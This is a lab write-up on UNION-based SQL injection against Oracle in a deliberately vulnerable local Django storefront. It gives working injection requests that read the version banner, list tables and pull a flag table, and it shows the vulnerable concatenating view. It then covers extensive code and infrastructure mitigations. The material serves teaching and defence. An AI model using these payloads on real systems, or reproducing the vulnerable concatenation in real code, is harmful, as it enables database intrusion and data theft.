# Lab 03 — SQL injection attack, querying the database type and version on Oracle

## 1. Lab overview

| Field | Value |
| --- | --- |
| PortSwigger reference | <https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle> |
| Lab id | `psw-sqli-03-oracle-version` |
| Vulnerability class | SQL Injection — UNION-based data extraction (DBMS fingerprinting) |
| CWE | [CWE-89 — Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html) |
| Backend | Oracle Database Free 23c (`gvenzl/oracle-free:23-slim-faststart`) |
| Host URL | <http://127.0.0.1:18003/> |
| Flag | `FLAG{psw-sqli-03-oracle-union-banner-extracted}` |

### Objective

The storefront exposes `GET /filter?category=<value>`. The category value is concatenated straight into a raw Oracle SQL statement. The learner must fingerprint the database as Oracle, discover the column count of the outer `SELECT`, and then use `UNION SELECT` against Oracle's `v$version` pseudo-view to surface the banner. A secondary goal — rewarded with the lab flag — is to pivot that same UNION technique across to the `flags` table once schema enumeration (via `ALL_TABLES`) reveals it.

---

## 2. Exploit walkthrough

Oracle imposes two syntactic quirks that shape the injection:

- Every `SELECT` must have a `FROM` clause — there is no bare `SELECT 'x'`. Oracle exposes the one-row pseudo-table `dual` for this purpose.
- Every column in a `UNION` must be type-compatible. The outer query here projects six columns (`id, name, category, description, price, released`), so the injected branch must project the same shape.

**Step 1 — baseline request**

```http
GET /filter?category=Gifts HTTP/1.1
Host: 127.0.0.1:18003
```

Server-side SQL:

```sql
SELECT id, name, category, description, price, released
FROM products
WHERE category = 'Gifts' AND released = 1
```

Three "Gifts" rows come back. The page reflects the composed SQL in an `Executed SQL` panel so the learner can verify the shape of each injection.

**Step 2 — confirm injection point and column count**

Break out of the string literal and append a UNION. Oracle requires `FROM dual` on any constant-only branch. The trailing `--` comments out the stray `' AND released = 1` tail.

```http
GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL,NULL,NULL,NULL+FROM+dual-- HTTP/1.1
```

Executed SQL:

```sql
SELECT id, name, category, description, price, released
FROM products
WHERE category = 'Gifts' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL FROM dual-- ' AND released = 1
```

A clean response with an extra blank row confirms six columns and a valid UNION.

**Step 3 — extract the Oracle version banner**

`v$version` has one `VARCHAR2` column called `banner`. Project it into any string-typed column of the outer SELECT — `name` or `description` are the obvious fits.

```http
GET /filter?category=Gifts'+UNION+SELECT+NULL,banner,NULL,NULL,NULL,NULL+FROM+v$version-- HTTP/1.1
```

Executed SQL:

```sql
SELECT id, name, category, description, price, released
FROM products
WHERE category = 'Gifts' UNION SELECT NULL,banner,NULL,NULL,NULL,NULL FROM v$version-- ' AND released = 1
```

The `name` column of the extra result row now contains something like:

```
Oracle Database 23c Free, Release 23.0.0.0.0 - Develop, Learn, and Run for Free
```

The view's `_contains_oracle_banner` check trips and the page shows the amber "progress check-point" banner.

**Step 4 — enumerate schema and pivot to the `flags` table**

List user-accessible tables via `ALL_TABLES`:

```
/filter?category=x'+UNION+SELECT+NULL,table_name,NULL,NULL,NULL,NULL+FROM+all_tables--
```

Among the results is `FLAGS` (Oracle uppercases unquoted identifiers — see [shop/models.py:4-19](shop/models.py#L4-L19)). Now extract its contents:

```http
GET /filter?category=x'+UNION+SELECT+NULL,content,NULL,NULL,NULL,NULL+FROM+flags-- HTTP/1.1
```

Executed SQL:

```sql
SELECT id, name, category, description, price, released
FROM products
WHERE category = 'x' UNION SELECT NULL,content,NULL,NULL,NULL,NULL FROM flags-- ' AND released = 1
```

The `name` cell of the lone result row carries `FLAG{psw-sqli-03-oracle-union-banner-extracted}`. The regex `FLAG\{[^}]+\}` in [shop/views.py:24](shop/views.py#L24) matches it, `_first_flag` returns the match, and the page flips to the green "FLAG CAPTURED" state ([shop/templates/shop/filter.html:5-9](shop/templates/shop/filter.html#L5-L9)).

---

## 3. Vulnerable code

### Endpoint: `GET /filter`

[shop/views.py:61-68](shop/views.py#L61-L68)

```python
def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")

    query = (
        "SELECT id, name, category, description, price, released "
        "FROM products "
        "WHERE category = '" + category + "' AND released = 1"
    )
```

The injection sink is the `+ category +` splice. No escaping, no allow-list, no type coercion — whatever bytes the client sends become SQL tokens. Because the outer query projects a fixed six-column tuple, the branch an attacker appends only has to conform to that shape; Oracle's rich catalog (`v$version`, `all_tables`, `user_tab_columns`, `dba_users`) becomes immediately reachable.

[shop/views.py:73-80](shop/views.py#L73-L80)

```python
try:
    with connection.cursor() as cursor:
        cursor.execute(query)
        columns = [col[0].lower() for col in cursor.description]
        for row in cursor.fetchall():
            rows.append(dict(zip(columns, row)))
except Exception as exc:
    error = f"Database error: {exc}"
```

`cursor.execute(query)` is called with exactly one positional argument — the composed string — so the Oracle client driver (`oracledb` / `cx_Oracle`) cannot tell data from code. Worse, the `except Exception` branch relays the Oracle `ORA-` error text straight to the template ([shop/views.py:79-80](shop/views.py#L79-L80)), turning parser errors into a fingerprinting oracle.

### Routing

[shop/urls.py:5-8](shop/urls.py#L5-L8) — the vulnerable view is mounted unauthenticated at `/filter`.

### Reflection of the composed SQL

[shop/views.py:91](shop/views.py#L91) passes `executed_sql` into the context and [shop/templates/shop/filter.html:22-24](shop/templates/shop/filter.html#L22-L24) renders it verbatim. Useful for training, catastrophic in production.

### Supporting models

[shop/models.py:4-19](shop/models.py#L4-L19) — the `products` table the benign query hits.
[shop/models.py:25-37](shop/models.py#L25-L37) — the sibling `flags` table that normal browsing never touches. Its sole purpose is to be surfaced via UNION once the attacker enumerates `ALL_TABLES`.

### Seeded flag

[shop/management/commands/seed.py:14](shop/management/commands/seed.py#L14) holds the literal flag string; [shop/management/commands/seed.py:45-46](shop/management/commands/seed.py#L45-L46) inserts the sole row into `flags`.

### Database wiring

[sqli_lab/settings.py:52-59](sqli_lab/settings.py#L52-L59) — Django's `django.db.backends.oracle` driver pointed at the `gvenzl/oracle-free` container. Note that the lab connects as `system` (see [docker-compose.yml:38-39](docker-compose.yml#L38-L39)) — a DBA-level principal. That is the worst-case privilege posture and amplifies post-exploitation options.

---

## 4. Why the vulnerability exists

| Root cause | Effect |
| --- | --- |
| **String concatenation of untrusted input into SQL** | The Oracle driver receives a pre-assembled statement and parses attacker-supplied tokens (`UNION`, `FROM`, `v$version`) as code. |
| **Outer SELECT projects a fixed, predictable column shape (6 cols, known types)** | Bootstrapping a working `UNION SELECT` is trivial — no column-count probing with `ORDER BY` is even needed beyond one request. |
| **No allow-list on `category`** | Category values are drawn from a tiny closed set (`Accessories`, `Tech`, `Lifestyle`, `Gifts`, `Pets`, `Clothing`) yet any byte string is accepted. |
| **Raw Oracle error strings reflected to the client** | `ORA-00933`, `ORA-01789`, `ORA-00942` each confirm DBMS family, syntax shape, and table existence — a fingerprint and oracle rolled into one. |
| **`executed_sql` echoed in the template** | Removes the guessing step entirely; the attacker sees the exact concatenated query. |
| **Application connects as `system` (DBA)** | Even read-only injection reaches `V$`, `DBA_*`, and `ALL_*` catalogs, plus potentially dangerous packages (`UTL_HTTP`, `DBMS_LDAP`, `DBMS_SCHEDULER`). |
| **`flags` table lives in the same schema as `products`** | A single UNION reaches it; no cross-schema privilege is required. |

---

## 5. Code-level mitigation

### 5.1 Parameterise the query

`oracledb` supports both named (`:category`) and numeric (`:1`) bind variables. Django's `cursor.execute` accepts `%s` placeholders and translates them.

```python
# shop/views.py — fixed
def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")

    query = (
        "SELECT id, name, category, description, price, released "
        "FROM products "
        "WHERE category = %s AND released = 1"
    )
    with connection.cursor() as cursor:
        cursor.execute(query, [category])   # list argument → bind variable
        rows = cursor.fetchall()
```

With `category` bound, the literal string `Gifts' UNION SELECT ... FROM v$version--` is compared byte-for-byte against the `category` column. Nothing matches, the result set is empty, and the UNION never reaches the parser.

### 5.2 Prefer the ORM

Hand-rolled SQL is unnecessary here — the request is a filter and a projection:

```python
from .models import Product

def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")
    qs = (
        Product.objects
        .filter(category=category, released=True)
        .values("id", "name", "category", "description", "price", "released")
    )
    return render(request, "shop/filter.html", {"category": category, "rows": list(qs)})
```

Django's query compiler emits a bind variable on every path. It also resolves the double bookkeeping of `released = 1` — that predicate lives in exactly one place.

### 5.3 Allow-list validation

`category` is drawn from a fixed taxonomy. Reject anything outside it before the query runs:

```python
ALLOWED_CATEGORIES = {"Accessories", "Tech", "Lifestyle", "Gifts", "Pets", "Clothing"}

def filter_products(request):
    category = request.GET.get("category", "")
    if category not in ALLOWED_CATEGORIES:
        return HttpResponseBadRequest("unknown category")
    ...
```

Allow-listing short-circuits the attack well before the driver is involved and removes an entire class of fuzzing surface.

### 5.4 Stop reflecting SQL and driver errors

Remove `executed_sql` from the render context and delete the `<pre class="sql">...</pre>` block in [shop/templates/shop/filter.html:22-24](shop/templates/shop/filter.html#L22-L24). Catch `django.db.DatabaseError` and render a generic "filter failed" message while logging the underlying Oracle error server-side. `ORA-` codes in HTTP responses are free fingerprinting.

### 5.5 Isolate the `flags` table

`flags` sits in the same Oracle schema as `products`, so a UNION across them needs no special privilege. Options:

- Move `flags` to a dedicated schema and grant `SELECT` only to a separate OS account the web app never authenticates as.
- Gate access through a stored procedure executed under a controlled definer with `AUTHID DEFINER`, exposing only the narrow operation the app actually needs.
- If `flags` is not needed at runtime, don't deploy it at all — store secrets in a vault (HashiCorp Vault, AWS Secrets Manager) and fetch them out-of-band.

### 5.6 Restrict the projection shape

The six-column tuple is what makes a one-shot UNION tractable. Query-level hardening (separate from parameterisation) includes:

- Return a narrower projection — e.g. only `id`, `name`, `price` — so any injected branch must match a tighter type profile.
- Wrap the select in a database view (`v_public_products`) that does the filtering, the projection, and — optionally — `WITH CHECK OPTION`. A view also lets you revoke `SELECT` on the base `PRODUCTS` table from the web role entirely.

---

## 6. Network / infrastructure-level mitigation

### 6.1 Web Application Firewall

Front the app with a WAF tuned for Oracle-specific signatures. The OWASP Core Rule Set matters here:

- `REQUEST-942` — Oracle signatures include `v$version`, `all_tables`, `user_tab_columns`, `UTL_HTTP`, `CTXSYS.DRITHSX.SN`.
- `REQUEST-920` — protocol enforcement blocks bizarre query-string lengths and non-UTF-8 sequences commonly used to tunnel payloads.
- `REQUEST-949` — anomaly scoring picks up combinations (`'`, `UNION`, `--`, `FROM dual`) even when individual tokens fall below paranoia level.

A WAF does not replace parameterisation. Oracle is especially friendly to encoding-based bypasses (`CHR(39)` for `'`, `||` concatenation) — any signature rule is a defense-in-depth layer, not a gate.

### 6.2 Least-privilege Oracle account

The compose file connects as `system` — a DBA. That is lab-only acceptable. For production:

- Create a dedicated schema owner and a separate application user.
- Grant the application user `SELECT` only on the tables it needs (`PRODUCTS`).
- `REVOKE SELECT ANY DICTIONARY` and ensure the account does not hold `SELECT_CATALOG_ROLE`; this blocks read access to `V$VERSION`, `V$INSTANCE`, `DBA_*`, etc.
- Revoke `EXECUTE` on dangerous packages: `UTL_HTTP`, `UTL_TCP`, `UTL_FILE`, `UTL_SMTP`, `DBMS_LDAP`, `DBMS_SCHEDULER`, `DBMS_XMLGEN`. Any of these can be turned into an egress or command-execution primitive from a UNION that returns control flow.
- Apply a resource profile that caps CPU per call, sessions per user, and `LOGICAL_READS_PER_CALL` — a UNION against `ALL_TABLES` on a large tenancy is otherwise a cheap DoS.

### 6.3 Network segmentation & egress control

The compose topology already puts Oracle on a private bridge, `psw-sqli-03-oracle-version-net`, and only exposes the app on `127.0.0.1:18003:8000` ([docker-compose.yml:30-31](docker-compose.yml#L30-L31)). Production equivalents:

- Oracle listener accessible only from the app subnet — never the internet.
- Outbound egress from the DB container denied by default. Oracle's built-in `UTL_HTTP` needs a working `ACL` *and* a route to make outbound calls; revoking the ACL *and* blackholing the route is belt-and-braces.
- Named network ACLs via `DBMS_NETWORK_ACL_ADMIN` tightened to an empty allow-list.

### 6.4 Monitoring & rate limiting

- Ship Oracle `AUDIT` events for failed parses, `SELECT` on `V$VERSION`, `SYS.USER_TAB_COLUMNS`, `SYS.ALL_TABLES` — these are unusual from an application user and a strong UNION-SQLi signal.
- Rate-limit `/filter` per client IP (e.g. 10 req/s) to blunt automated tooling (`sqlmap`).
- Alert on sustained `ORA-00933` / `ORA-01789` / `ORA-00942` at the application log tier — these are the classic UNION-probing errors.
- Baseline response-body sizes for `/filter` and alert on outliers; a UNION that dumps `ALL_TABLES` looks very different from a normal six-row response.

### 6.5 Platform hardening

- Pin the Oracle image digest rather than `gvenzl/oracle-free:23-slim-faststart` (floating tag).
- Run the web container as a non-root user (absent from this lab's Dockerfile).
- Rotate the `ORACLE_PASSWORD` env var out of the compose file into a secret store.

---

## 7. Defense-in-depth checklist

- [ ] Parameterised queries everywhere — no `+`, `%`, or f-string SQL assembly.
- [ ] ORM by default; raw SQL only where justified and code-reviewed.
- [ ] Allow-list validation for known-enumerable fields (categories, sort columns, page sizes).
- [ ] Dedicated Oracle app user — never `system` / `sys` / `sysdba`.
- [ ] `SELECT ANY DICTIONARY` and `SELECT_CATALOG_ROLE` explicitly revoked.
- [ ] `EXECUTE` on `UTL_*`, `DBMS_LDAP`, `DBMS_SCHEDULER`, `DBMS_XMLGEN` revoked.
- [ ] Network ACLs empty unless a specific egress is justified.
- [ ] Secrets stored outside schemas the app can `SELECT`; ideally outside the DB entirely.
- [ ] Driver/DB errors mapped to generic messages before reaching the client.
- [ ] Composed SQL never reflected in responses — no `executed_sql`, no stack traces.
- [ ] Narrow projections; base tables revoked in favour of row-restricted views.
- [ ] Oracle `AUDIT` policies on dictionary reads, with SIEM alerts.
- [ ] WAF in front of the app with a tuned Oracle signature set.
- [ ] SAST rules catching `cursor.execute(f"...")`, `cursor.execute("..." + x)`, `cursor.execute("..." % x)`.
- [ ] Rate limiting and response-size anomaly detection on filter endpoints.

---

## 8. References

- PortSwigger Web Security Academy — [SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
- PortSwigger — [SQL injection UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- OWASP — [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- CWE-89 — <https://cwe.mitre.org/data/definitions/89.html>
- Oracle Database 23c — [`V$VERSION` reference](https://docs.oracle.com/en/database/oracle/oracle-database/23/refrn/V-VERSION.html)
- Oracle Database 23c — [`ALL_TABLES` reference](https://docs.oracle.com/en/database/oracle/oracle-database/23/refrn/ALL_TABLES.html)
- Oracle Database — [Security Guide: Least Privilege and Separation of Duty](https://docs.oracle.com/en/database/oracle/oracle-database/23/dbseg/managing-security-for-application-developers.html)
- Django docs — [Performing raw SQL queries](https://docs.djangoproject.com/en/5.0/topics/db/sql/#executing-custom-sql-directly)
- `python-oracledb` driver — [Using bind variables](https://python-oracledb.readthedocs.io/en/latest/user_guide/bind.html)
- OWASP CRS — <https://coreruleset.org/>
